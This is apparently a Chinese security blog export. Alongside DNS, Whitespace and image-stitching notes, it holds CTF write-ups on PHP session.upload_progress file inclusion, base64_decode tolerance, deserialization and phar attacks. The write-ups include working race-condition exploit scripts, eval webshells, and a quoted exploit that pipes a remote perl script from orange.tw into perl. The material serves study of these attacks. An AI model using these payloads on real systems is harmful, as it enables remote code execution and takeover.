Server）。NS记录是域名服务器记录，用来指定该域名由哪个DNS服务器来进行解析。NS记录中的IP即为该DNS服务器的IP地址。大多数域名注册商默认用自己的NS服务器来解析用户的DNS记录。DNS服务器NS记录地址一般以以下的形式出现：ns1.domain.com、ns2.domain.com等。 三、NS记录与SOA记录的区别 ​ SOA，是起始授权机构记录，说明了在众多 NS 记录里哪一台才是主要的服务器。在任何DNS记录文件中，都是以SOA（Startof Authority ）记录开始。SOA资源记录表明此DNS名称服务器是该DNS域中数据信息的最佳来源。 ​ SOA记录与NS记录的区别：NS记录表示域名服务器记录，用来指定该域名由哪个DNS服务器来进行解析；SOA记录设置一些数据版本和更新以及过期时间等信息。 NS 与 CNAME https://www.cloudflare.com/zh-cn/learning/dns/dns-records/dns-cname-record/ https://www.cloudflare.com/zh-cn/learning/dns/dns-records/dns-ns-record/ 鸟哥Linux私房菜—DNS服务器搭建 https://webmasters.stackexchange.com/questions/78181/understanding-cname-and-ns-in-dns https://developer.aliyun.com/article/395311"},{"title":"奇葩编程语言-Whitespace","date":"2019-12-08","updated":"2024-03-19","path":"2019/12/08/奇葩编程语言-Whitespace/","text":"今天看hackgame2019时发现有一个题用到了一个非常奇葩的语言-- Whitespace,于是乎搜了一下，发现确实奇葩 下面内容来自开源中国 什么是“Whitespace”编程语言? 大多数的编程语言都会忽略代码中的空白字符(空格，tab，换行符)，有它们没它们都是一样的。但有人却认为这不公平，认为这些无形的字符也应该被 友好的受到重视。只是因为看不见它们就忽略它们的存在吗？于是，“Whitespace”编程语言就这样诞生了。“Whitespace”是专门来弥补普 通编程语言中歧视，它给予这些空白字符最重要的地位。在“Whitespace”编程语言中，任何非空白的字符都是被忽略的，只有空格符，tab和换行符 被认为是有效的语义字符。 “Whitespace”编程语言有什么优势? 有些任务，当使用其它编程语言开发非常困难时，使用Whitespace编程却变得非常容易。比如，加密程序。 Whitespace编程语言尤其适合间谍工作。假设你有一个非常机密的程序，不想任何人看到，该怎么做？你需要用Whitespace编程语言编写，然后把代码打印出来，删除源文件。打印出的代码几乎全部是空白，没人会想到它是高度机密的计算机程序源代码！ 使用“Whitespace”语言编写的程序会是什么样子？ 下面这段代码看起来是一片空白，但它确实是一段有效的“Whitespace”程序代码。你可以从这里查看它的源代码。 1 如何编译，运行”Whitespace”源代码？ 这有一个beta版的代码解释器，你可以在这里下载它。解释器是用Haskell语言写出的，你还可以下载它的Linux二进制程序。这里还有一篇指导说明。 是谁开发了这种语言？ 解释器是由Edwin Brady——一个整天熬夜的人——开发的。而语言是由 Edwin Brady 和 Chris Morris —— 两个喝了太多的咖啡的人——开发的。Andrew Stribblehill也是其中的一份子。同时还要感谢#compsoc邮件组的网友们给出的建议和帮助。 “Whitespace”编程语言官方主页 稿源：程序师 相关链接 WhiteSpace 的详细介绍：点击查看 WhiteSpace 的下载地址：点击下载 WhiteSpace 的在线IDE： 在线IDE 我们之间留了太多空白格～～～～"},{"title":"python图片拼接","date":"2019-12-08","updated":"2024-03-19","path":"2019/12/08/python图片拼接/","text":"通过图片的修改时间来拼图 os的一些操作 12345678910import osimport timefile=&#x27;1.mp4&#x27;os.path.getatime(file) #输出最近访问时间1318921018.0os.path.getctime(file) #输出文件创建时间os.path.getmtime(file) #输出最近修改时间time.gmtime(os.path.getmtime(file)) #以struct_time形式输出最近修改时间os.path.getsize(file) #输出文件大小（字节为单位）os.path.abspath(file) #输出绝对路径&#x27;/Volumes/Leopard/Users/Caroline/Desktop/1.mp4&#x27;os.path.normpath(file) #输出&#x27;/Volumes/Leopard/Users/Caroline/Desktop/1.mp4&#x27; 基于时间考虑就是默认认为图片碎片生成的时间是有规律的，从上往下，由左至右 我们利用os.path.getmtime(file) #输出最近修改时间即可快速完成 123456789101112131415161718192021222324252627# coding=utf-8import osfrom PIL import Imagepath = &quot;./all/&quot;def get_file_list(file_path): dir_list = os.listdir(file_path) if not dir_list: return else: dir_list = sorted(dir_list, key=lambda x: os.path.getmtime(os.path.join(file_path, x))) print(dir_list) return dir_listlist_im = get_file_list(path)column = 6row_num = 6width = 51height = 51imgs = [Image.open(path+i) for i in list_im]target = Image.new(&#x27;RGB&#x27;, (width*column, height*row_num))for i in range(len(list_im)): if i % column == 0: end = len(list_im) if i + column &gt; len(list_im) else i + column for col, image in enumerate(imgs[i:i+column]): target.paste(image, (width*col, height*(i//column), width*(col + 1), height*(i//column + 1))) target.show() 自己修改长度和后缀 123456789101112131415161718192021222324252627282930313233343536373839import osfrom PIL import Imagepath = &quot;./result/&quot;def get_file_list(file_path): dir_list = os.listdir(file_path) if not dir_list: return else: dir_list = sorted(dir_list, key=lambda x: os.path.getmtime(os.path.join(file_path, x))) print(dir_list) return dir_listlist_im = get_file_list(path)column = 6row_num = 6width = 134height = 134for i in list_im: os.rename(path+i,path+i+&#x27;.png&#x27;) img = Image.open(path+i+&#x27;.png&#x27;) out = img.resize((width, height),Image.ANTIALIAS) os.remove(path+i+&#x27;.png&#x27;) out.save(path+i+&#x27;.png&#x27;, &#x27;png&#x27;)imgs = [Image.open(path+i+&#x27;.png&#x27;) for i in list_im]target = Image.new(&#x27;RGB&#x27;, (width*column, height*row_num))for i in range(len(list_im)): if i % column == 0: end = len(list_im) if i + column &gt; len(list_im) else i + column for col, image in enumerate(imgs[i:i+column]): target.paste(image, (width*col, height*(i//column), width*(col + 1), height*(i//column + 1))) target.show() 链接"},{"title":"hitcon2018.md","date":"2019-12-08","updated":"2024-03-19","path":"2019/12/08/hitcon2018-md/","text":"题目代码如下： 1($_=@$_GET[&#x27;orange&#x27;]) &amp;&amp; @substr(file($_)[0],0,6) === &#x27;@ ? include($_) : highlight_file(__FILE__); php的session.upload_progress.enabled=On引起的一个小问题 由于这个题目连session都没开，所以我根本就没有考虑去包含session。 但是最后看了orange的exp我才发现，只要发的POST请求中只要包含ini_get(&quot;session.upload_progress.name&quot;)这个键值，并带上session_id，同时进行文件上传，就会直接创建一个session文件。 搭建一个上传文件的页面 upload.html 12345678910111213&lt;html&gt;&lt;body&gt;&lt;form action=&quot;upload_file.php&quot; method=&quot;post&quot;enctype=&quot;multipart/form-data&quot;&gt;&lt;label for=&quot;file&quot;&gt;Filename:&lt;/label&gt;&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt; &lt;br /&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; upload_file.php 12345678910111213&lt;?phpif ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0) &#123; echo &quot;Error: &quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br /&gt;&quot;; &#125;else &#123; echo &quot;Upload: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;&lt;br /&gt;&quot;; echo &quot;Type: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;] . &quot;&lt;br /&gt;&quot;; echo &quot;Size: &quot; . ($_FILES[&quot;file&quot;][&quot;size&quot;] / 1024) . &quot; Kb&lt;br /&gt;&quot;; echo &quot;Stored in: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]; &#125;?&gt; 测试如下，先删除session文件： 12root@kali:/var/lib/php/sessions# rm sess_6hb0hqruuv7d5p2b6jtgs1i8no root@kali:/var/lib/php/sessions# ls 然后上传任意一个文件,发现并没有生成session 123456789101112131415161718192021222324POST /CTF/hitcon2018/one-line-php-challenge/upload_file.php HTTP/1.1Host: 192.168.92.129User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://192.168.92.129/CTF/hitcon2018/one-line-php-challenge/upload.htmlContent-Type: multipart/form-data; boundary=---------------------------23634071864731266927650791Content-Length: 452Connection: closeUpgrade-Insecure-Requests: 1-----------------------------23634071864731266927650791Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;burpsuite_pro&quot;Content-Type: application/octet-streamjava -Xbootclasspath/p:/opt/burpsuite/burp-loader-keygen.jar -jar /opt/burpsuite/burpsuite_pro_v1.7.37.jar-----------------------------23634071864731266927650791Content-Disposition: form-data; name=&quot;submit&quot;Submit-----------------------------23634071864731266927650791-- 然后在上传内容中构造session.upload_progress.name键值: 1234567891011121314151617181920212223242526272829POST /CTF/hitcon2018/one-line-php-challenge/upload_file.php HTTP/1.1Host: 192.168.92.129User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://192.168.92.129/CTF/hitcon2018/one-line-php-challenge/upload.htmlCookie: PHPSESSID=u0hgfruaudns3jigq5trocbr0mContent-Type: multipart/form-data; boundary=---------------------------23634071864731266927650791Content-Length: 586Connection: closeUpgrade-Insecure-Requests: 1-----------------------------23634071864731266927650791Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; test-----------------------------23634071864731266927650791Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;burpsuite_pro&quot;Content-Type: application/octet-streamjava -Xbootclasspath/p:/opt/burpsuite/burp-loader-keygen.jar -jar /opt/burpsuite/burpsuite_pro_v1.7.37.jar-----------------------------23634071864731266927650791Content-Disposition: form-data; name=&quot;submit&quot;Submit-----------------------------23634071864731266927650791-- 上传后发现生成了session 12root@kali:/var/lib/php/sessions# lssess_rlj8ralp0imdacas126gtom0co session文件内容 123upload_progress_@&lt;?php eval($_GET[1]);|a:5:&#123;s:10:&quot;start_time&quot;;i:1540269279;s:14:&quot;content_length&quot;;i:315;s:15:&quot;bytes_processed&quot;;i:315;s:4:&quot;done&quot;;b:0;s:5:&quot;files&quot;;a:1:&#123;i:0;a:7:&#123;s:10:&quot;field_name&quot;;s:6:&quot;upload&quot;;s:4:&quot;name&quot;;s:4:&quot;test&quot;;s:8:&quot;tmp_name&quot;;N;s:5:&quot;error&quot;;i:0;s:4:&quot;done&quot;;b:0;s:10:&quot;start_time&quot;;i:1540269279;s:15:&quot;bytes_processed&quot;;i:315;&#125;&#125;&#125; 开头是upload_progress_@&lt;?php eval($_GET[1]);,题目要求开头是@&lt;?php 绕过@substr(file($_)[0],0,6) === ‘@&lt;?php’ 这里用到了base64_decode() 的容错性: base64解码函数可以接受的字符范围是[A-Za-z0-9+/=]，但是如果php的base64_decode遇到了不在此范围内的字符，php就会直接跳过这些字符，只把在此范围的字符连起来进行解码。 123456789101112$i = 0 ;$data = &quot;upload_progress_ZZ&quot;;while(true)&#123; $i += 1; $data = base64_decode($data); var_dump($data); sleep(1); if($data == &#x27;&#x27;)&#123; echo &quot;一共解码了:&quot;.$i,&quot;次\\n&quot;; break; &#125;&#125; 12345string(12) &quot;��hi�k�޲�Y&quot;string(3) &quot;�)&quot;string(0) &quot;&quot;一共解码了:3次 upload_progress_ZZ一共是18个字符，但是由于base64_decode跳过了_，所以是剩下16个字符，解码一次之后是12个字符，又因为12个字符中只有4个在范围内，所以再次解码之后变为了3个字符，这三个字符都不在范围内，所以解码之后为空字符串。 这里需要注意的是我们在upload_progress_前缀后面扩展了两位是ZZ，这个ZZ的选择也是非常有讲究的，必须保证每一次的的base64解码之后的可接受字符个数都必须是4的整数倍,否则就会吞掉后面的payload。 举个例子upload_progress_AA就是不满足条件的，因为一次base64解码之后变为了 12string(12) &quot;��hi�k�޲�&quot; 可接受字符变为了3个，不是4的倍数，那么在下一次进行base64解码的时候，一定会吞掉后面的一位，导致payload部分被破坏掉。 所以最后控制SESSION的key值为： 1&quot;upload_progress_ZZ&quot;.base64_encode(base64_encode(base64_encode(&#x27;@&lt;?php eval($_GET[1]);&#x27;))); 然后进行三次的base_64decode，就会去掉upload_progress_,只剩下@&lt;?php eval($_GET[1]); 最后附上orange的exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556import sysimport stringimport requestsfrom base64 import b64encodefrom random import sample, randintfrom multiprocessing.dummy import Pool as ThreadPool HOST = &#x27;http://54.250.246.238/&#x27;sess_name = &#x27;iamorange&#x27; headers = &#123; &#x27;Connection&#x27;: &#x27;close&#x27;, &#x27;Cookie&#x27;: &#x27;PHPSESSID=&#x27; + sess_name&#125; payload = &#x27;@&lt;?php `curl orange.tw/w/bc.pl|perl -`;?&gt;&#x27; while 1: junk = &#x27;&#x27;.join(sample(string.ascii_letters, randint(8, 16))) x = b64encode(payload + junk) xx = b64encode(b64encode(payload + junk)) xxx = b64encode(b64encode(b64encode(payload + junk))) if &#x27;=&#x27; not in x and &#x27;=&#x27; not in xx and &#x27;=&#x27; not in xxx: print xxx break def runner1(i): data = &#123; &#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: &#x27;ZZ&#x27; + xxx + &#x27;Z&#x27; &#125; while 1: fp = open(&#x27;/etc/passwd&#x27;, &#x27;rb&#x27;) r = requests.post(HOST, files=&#123;&#x27;f&#x27;: fp&#125;, data=data, headers=headers) fp.close() def runner2(i): filename = &#x27;/var/lib/php/sessions/sess_&#x27; + sess_name filename = &#x27;php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s&#x27; % filename # print filename while 1: url = &#x27;%s?orange=%s&#x27; % (HOST, filename) r = requests.get(url, headers=headers) c = r.content if c and &#x27;orange&#x27; not in c: print if sys.argv[1] == &#x27;1&#x27;: runner = runner1else: runner = runner2 pool = ThreadPool(32)result = pool.map_async( runner, range(32) ).get(0xffff) SQL SO Hard 题目代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141#!/usr/bin/node/** * @HITCON CTF 2017 * @Author Orange Tsai */const qs = require(&quot;qs&quot;);const fs = require(&quot;fs&quot;);const pg = require(&quot;pg&quot;);const mysql = require(&quot;mysql&quot;);const crypto = require(&quot;crypto&quot;);const express = require(&quot;express&quot;);const pool = mysql.createPool(&#123; connectionLimit: 100, host: &quot;localhost&quot;, user: &quot;ban&quot;, password: &quot;ban&quot;, database: &quot;bandb&quot;,&#125;);const client = new pg.Client(&#123; host: &quot;localhost&quot;, user: &quot;userdb&quot;, password: &quot;userdb&quot;, database: &quot;userdb&quot;,&#125;);client.connect();const KEYWORDS = [ &quot;select&quot;, &quot;union&quot;, &quot;and&quot;, &quot;or&quot;, &quot;\\\\&quot;, &quot;/&quot;, &quot;*&quot;, &quot; &quot; ]function waf(string) &#123; for (var i in KEYWORDS) &#123; var key = KEYWORDS[i]; if (string.toLowerCase().indexOf(key) !== -1) &#123; return true; &#125; &#125; return false;&#125;const app = express();app.use((req, res, next) =&gt; &#123; var data = &quot;&quot;; req.on(&quot;data&quot;, (chunk) =&gt; &#123; data += chunk&#125;) req.on(&quot;end&quot;, () =&gt;&#123; req.body = qs.parse(data); next(); &#125;)&#125;)app.all(&quot;/*&quot;, (req, res, next) =&gt; &#123; if (&quot;show_source&quot; in req.query) &#123; return res.end(fs.readFileSync(__filename)); &#125; if (req.path == &quot;/&quot;) &#123; return next(); &#125; var ip = req.connection.remoteAddress; var payload = &quot;&quot;; for (var k in req.query) &#123; if (waf(req.query[k])) &#123; payload = req.query[k]; break; &#125; &#125; for (var k in req.body) &#123; if (waf(req.body[k])) &#123; payload = req.body[k]; break; &#125; &#125; if (payload.length &gt; 0) &#123; var sql = `INSERT INTO blacklists(ip, payload) VALUES(?, ?) ON DUPLICATE KEY UPDATE payload=?`; &#125; else &#123; var sql = `SELECT ?,?,?`; &#125; return pool.query(sql, [ip, payload, payload], (err, rows) =&gt; &#123; var sql = `SELECT * FROM blacklists WHERE ip=?`; return pool.query(sql, [ip], (err,rows) =&gt; &#123; if ( rows.length == 0) &#123; return next(); &#125; else &#123; return res.end(&quot;Shame on you&quot;); &#125; &#125;); &#125;);&#125;);app.get(&quot;/&quot;, (req, res) =&gt; &#123; var sql = `SELECT * FROM blacklists GROUP BY ip`; return pool.query(sql, [], (err,rows) =&gt; &#123; res.header(&quot;Content-Type&quot;, &quot;text/html&quot;); var html = &quot;&lt;pre&gt;Here is the &lt;a href=/?show_source=1&gt;source&lt;/a&gt;, thanks to Orange\\n\\n&lt;h3&gt;Hall of Shame&lt;/h3&gt;(delete every 60s)\\n&quot;; for(var r in rows) &#123; html += `$&#123;parseInt(r)+1&#125;. $&#123;rows[r].ip&#125;\\n`; &#125; return res.end(html); &#125;);&#125;);app.post(&quot;/reg&quot;, (req, res) =&gt; &#123; var username = req.body.username; var password = req.body.password; if (!username || !password || username.length &lt; 4 || password.length &lt; 4) &#123; return res.end(&quot;Bye&quot;); &#125; password = crypto.createHash(&quot;md5&quot;).update(password).digest(&quot;hex&quot;); var sql = `INSERT INTO users(username, password) VALUES(&#x27;$&#123;username&#125;&#x27;, &#x27;$&#123;password&#125;&#x27;) ON CONFLICT (username) DO NOTHING`; return client.query(sql.split(&quot;;&quot;)[0], (err, rows) =&gt; &#123; if (rows &amp;&amp; rows.rowCount == 1) &#123; return res.end(&quot;Reg OK&quot;); &#125; else &#123; return res.end(&quot;User taken&quot;); &#125; &#125;);&#125;);app.listen(31337, () =&gt; &#123; console.log(&quot;Listen OK&quot;);&#125;); 留坑。。"},{"title":"php中的session.upload_progress","date":"2019-12-07","updated":"2024-03-19","path":"2019/12/07/php中的session-upload-progress/","text":"hitcon2018 one-line-php-challenge php中的session.upload_progress php中的session.upload_progress 这个功能在php5.4添加的，所以测试的小伙伴，注意下版本哦。 在php.ini有以下几个默认选项 1234561. session.upload_progress.enabled = on2. session.upload_progress.cleanup = on3. session.upload_progress.prefix = &quot;upload_progress_&quot;4. session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;5. session.upload_progress.freq = &quot;1%&quot;6. session.upload_progress.min_freq = &quot;1&quot; 其实这里，我们只需要了解前四个配置选项即可 enabled=on表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ； cleanup=on表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要； name当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控； prefix+name将表示为session中的键名 利用session.upload_progress进行文件包含利用 示例代码 1&lt;?php$b=$_GET[&#x27;file&#x27;];include &quot;$b&quot;;?&gt; 可以发现，存在一个文件包含漏洞，但是找不到一个可以包含的恶意文件。其实，我们可以利用session.upload_progress将恶意语句写入session文件，从而包含session文件。前提需要知道session文件的存放位置。 分析 问题一 代码里没有session_start(),如何创建session文件呢。 解答一 其实，如果session.auto_start=On ，则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()。但默认情况下，这个选项都是关闭的。 但session还有一个默认选项，session.use_strict_mode默认值为0。此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID=TGAO，PHP将会在服务器上创建一个文件：/tmp/sess_TGAO”。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有ini.get(“session.upload_progress.prefix”)+由我们构造的session.upload_progress.name值组成，最后被写入sess_文件里。 问题二 但是问题来了，默认配置session.upload_progress.cleanup = on导致文件上传后，session文件内容立即清空， 如何进行rce呢？ 解答二 此时我们可以利用竞争，在session文件内容清空前进行包含利用。 利用脚本 123456789101112131415161718192021222324252627#coding=utf-8import ioimport requestsimport threadingsessid = &#x27;TGAO&#x27;data = &#123;&quot;cmd&quot;:&quot;system(&#x27;whoami&#x27;);&quot;&#125;def write(session): while True: f = io.BytesIO(b&#x27;a&#x27; * 1024 * 50) resp = session.post( &#x27;http://127.0.0.1:5555/test56.php&#x27;, data=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: &#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;&#125;, files=&#123;&#x27;file&#x27;: (&#x27;tgao.txt&#x27;,f)&#125;, cookies=&#123;&#x27;PHPSESSID&#x27;: sessid&#125; )def read(session): while True: resp = session.post(&#x27;http://127.0.0.1:5555/test56.php?file=session/sess_&#x27;+sessid,data=data) if &#x27;tgao.txt&#x27; in resp.text: print(resp.text) event.clear() else: print(&quot;[+++++++++++++]retry&quot;)if __name__==&quot;__main__&quot;: event=threading.Event() with requests.session() as session: for i in xrange(1,30): threading.Thread(target=write,args=(session,)).start()​ for i in xrange(1,30): threading.Thread(target=read,args=(session,)).start() event.set() 小结 利用条件 \\1. 存在文件包含漏洞 \\2. 知道session文件存放路径，可以尝试默认路径 \\3. 具有读取和写入session文件的权限 利用session.upload_progress进行反序列化攻击 示例代码 12345678910111213141516171819202122232425262728293031&lt;?phperror_reporting(0);date_default_timezone_set(&quot;Asia/Shanghai&quot;);ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php&#x27;);session_start();class Door&#123; public $handle;​ function __construct() &#123; $this-&gt;handle=new TimeNow(); &#125;​ function __destruct() &#123; $this-&gt;handle-&gt;action(); &#125;&#125;class TimeNow &#123; function action() &#123; echo &quot;你的访问时间:&quot;.&quot; &quot;.date(&#x27;Y-m-d H:i:s&#x27;,time()); &#125;&#125;class IP&#123; public $ip; function __construct() &#123; $this-&gt;ip = &#x27;echo $_SERVER[&quot;REMOTE_ADDR&quot;];&#x27;; &#125; function action() &#123; eval($this-&gt;ip); &#125;&#125;?&gt; 分析 问题一 整个代码没有参数可控的地方。通过什么方法来进行反序列化利用呢 解答一 这里，利用PHP_SESSION_UPLOAD_PROGRESS上传文件，其中利用文件名可控，从而构造恶意序列化语句并写入session文件。 另外，与文件包含利用一样，也需要进行竞争。 利用脚本 首先利用exp.php脚本构造恶意序列化语句 12345678910111213141516171819202122232425262728293031323334353637&lt;?phpini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);session_start();class Door&#123; public $handle;​ function __construct() &#123; $this-&gt;handle = new IP(); &#125;​ function __destruct() &#123; $this-&gt;handle-&gt;action(); &#125;&#125;class TimeNow &#123; function action() &#123; echo &quot;你的访问时间:&quot;.&quot; &quot;.date(&#x27;Y-m-d H:i:s&#x27;,time()); &#125;&#125;​class IP&#123; public $ip; function __construct() &#123; //$this-&gt;ip=&#x27;payload&#x27;; $this-&gt;ip=&#x27;phpinfo();&#x27;; //$this-&gt;ip=&#x27;print_r(scandir(&#x27;/&#x27;));&#x27;; &#125; function action() &#123; eval($this-&gt;ip); &#125;&#125;$a=new Door();$b=serialize($a);$c=addslashes($b);$d=str_replace(&quot;O:4:&quot;,&quot;|O:4:&quot;,$c);echo $d;?&gt; 与此同时利用exp.py脚本进行竞争 123456789101112131415161718192021222324252627282930313233343536373839404142434445#coding=utf-8import requestsimport threadingimport ioimport sys​def exp(ip,port): f = io.BytesIO(b&#x27;a&#x27; * 1024 *1024*1) while True: et.wait() url = &#x27;http://&#x27;+ip+&#x27;:&#x27;+str(port)+&#x27;/test5.php&#x27; headers = &#123; &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&#x27;, &#x27;Accept&#x27;: &#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;, &#x27;Accept-Language&#x27;: &#x27;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&#x27;, &#x27;DNT&#x27;: &#x27;1&#x27;, &#x27;Cookie&#x27;: &#x27;PHPSESSID=20190506&#x27;, &#x27;Connection&#x27;: &#x27;close&#x27;, &#x27;Upgrade-Insecure-Requests&#x27;: &#x27;1&#x27; &#125; proxy = &#123; &#x27;http&#x27;: &#x27;127.0.0.1:8080&#x27; &#125; data=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;:&#x27;123&#x27;&#125; files=&#123; &#x27;file&#x27; :( r&#x27;|O:4:\\&quot;Door\\&quot;:1:&#123;s:6:\\&quot;handle\\&quot;;O:2:\\&quot;IP\\&quot;:1:&#123;s:2:\\&quot;ip\\&quot;;s:10:\\&quot;phpinfo();\\&quot;;&#125;&#125;&#x27;,f,&#x27;text/plain&#x27;) &#125; resp = requests.post(url,headers=headers,data=data,files=files,proxies=proxy) #,proxies=proxy resp.encoding=&quot;utf-8&quot; if len(resp.text)&lt;2000: print(&#x27;[+++++]retry&#x27;) else: print(resp.content.decode(&#x27;utf-8&#x27;).encode(&#x27;utf-8&#x27;)) et.clear() print(&#x27;success!&#x27;) ​if __name__ == &quot;__main__&quot;: ip=sys.argv[1] port=int(sys.argv[2]) et=threading.Event() for i in xrange(1,40): threading.Thread(target=exp,args=(ip,port)).start() et.set() 首先在代码里加个代理，利用burp抓包。如下图 这里有几个注意点： PHPSESSID必须要有，因为要竞争同一个文件 filename可控，但是在值的最前面加上|,因为最终目的是利用session的反序列化，PHP_SESSION_UPLOAD_PROGRESS只是个跳板。其次把字符串中的双引号转义，以防止与最外层的双引号冲突 上传的文件要大些，否则很难竞争成功。我写入是这么大f = io.BytesIO(b'a' * 1024 *1024*1) filename值中出现汉字时，会出错，所以在利用脚本前，一定要修改python源码 最后把exp.py中的代理去掉，直接跑exp.py,效果如下。 几次失败尝试 其实，利用burp抓到exp.py流量后，可以直接在burp爆破，但貌似数据包数据有点多，导致burp反应很慢，最终失败。 另外，我尝试伪造PHP_SESSION_UPLOAD_PROGRESS的值，但是值中一旦出现|，将会导致数据写入session文件失败。 小结 利用条件主要是存在session反序列化漏洞。 从文件包含和反序列化两个利用点，可以发现，利用PHP_SESSION_UPLOAD_PROGRESS可以绕过大部分过滤，而且传输的数据也不易发现。"},{"title":"php_base64_decode的容错","date":"2019-12-07","updated":"2024-03-19","path":"2019/12/07/php-base64-decode的容错/","text":"base64解码函数可以接受的字符范围是[A-Za-z0-9+/=]，但是如果php的base64_decode遇到了不在此范围内的字符，php就会直接跳过这些字符，只把在此范围的字符连起来进行解码。 我们来做个试验： 1`$i` `= 0 ;``$data` `= ``&quot;upload_progress_ZZ&quot;``;``while``(true)&#123;`` ``$i` `+= 1;`` ``$data` `= ``base64_decode``(``$data``); `` ``var_dump(``$data``);`` ``sleep(1);`` ``if``(``$data` `== ``&#x27;&#x27;``)&#123;`` ``echo` `&quot;一共解码了:&quot;``.``$i``,``&quot;次\\n&quot;``;`` ``break``;`` ``&#125;``&#125;` 运行结果如下： 1`string(12) &quot;��hi�k�``޲�Y&quot;``string(3) ``&quot;�)&quot;``string(0) ``&quot;&quot;``一共解码了:3次` upload_progress_ZZ一共是18个字符，但是由于base64_decode跳过了_，所以是剩下16个字符，解码一次之后是12个字符，又因为12个字符中只有4个在范围内，所以再次解码之后变为了3个字符，这三个字符都不在范围内，所以解码之后为空字符串。 hitcon2018 one-line-php-challenge"},{"title":"phar协议","date":"2019-12-07","updated":"2024-03-19","path":"2019/12/07/phar协议/","text":"phar协议 2.1 phar文件结构 在了解攻击手法之前我们要先看一下phar的文件结构，通过查阅手册可知一个phar文件有四部分构成： 1. a stub 可以理解为一个标志，格式为xxx，前面内容不限，但必须以__HALT_COMPILER();?&gt;来结尾，否则phar扩展将无法识别这个文件为phar文件。 2. a manifest describing the contents phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。 3. the file contents 被压缩文件的内容。 4. [optional] a signature for verifying Phar integrity (phar file format only) 签名，放在文件末尾，格式如下： 2.2 demo测试 根据文件结构我们来自己构建一个phar文件，php内置了一个Phar类来处理相关操作。 注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件。 123456789101112131415phar_gen.php&lt;?php class TestObject &#123; &#125; @unlink(&quot;phar.phar&quot;); $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub $o = new TestObject(); $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件 //签名自动计算 $phar-&gt;stopBuffering();?&gt; 可以明显的看到meta-data是以序列化的形式存储的： 有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下： 来看一下php底层代码是如何处理的： 1php-src/ext/phar/phar.c 通过一个小demo来证明一下： 1234567891011phar_test1.php&lt;?php class TestObject &#123; public function __destruct() &#123; echo &#x27;Destruct called&#x27;; &#125; &#125; $filename = &#x27;phar://phar.phar/test.txt&#x27;; file_get_contents($filename); ?&gt; 其他函数当然也是可行的： 123456789101112phar_test2.php&lt;?php class TestObject &#123; public function __destruct() &#123; echo &#x27;Destruct called&#x27;; &#125; &#125; $filename = &#x27;phar://phar.phar/a_random_string&#x27;; file_exists($filename); //...... ?&gt; 当文件系统函数的参数可控时，我们可以在不调用unserialize()的情况下进行反序列化操作，一些之前看起来“人畜无害”的函数也变得“暗藏杀机”，极大的拓展了攻击面。 2.3 将phar伪造成其他格式的文件 在前面分析phar的文件结构时可能会注意到，php识别phar文件是通过其文件头的stub，更确切一点来说是__HALT_COMPILER();?&gt;这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。 1234567891011121314&lt;?php class TestObject &#123; &#125; 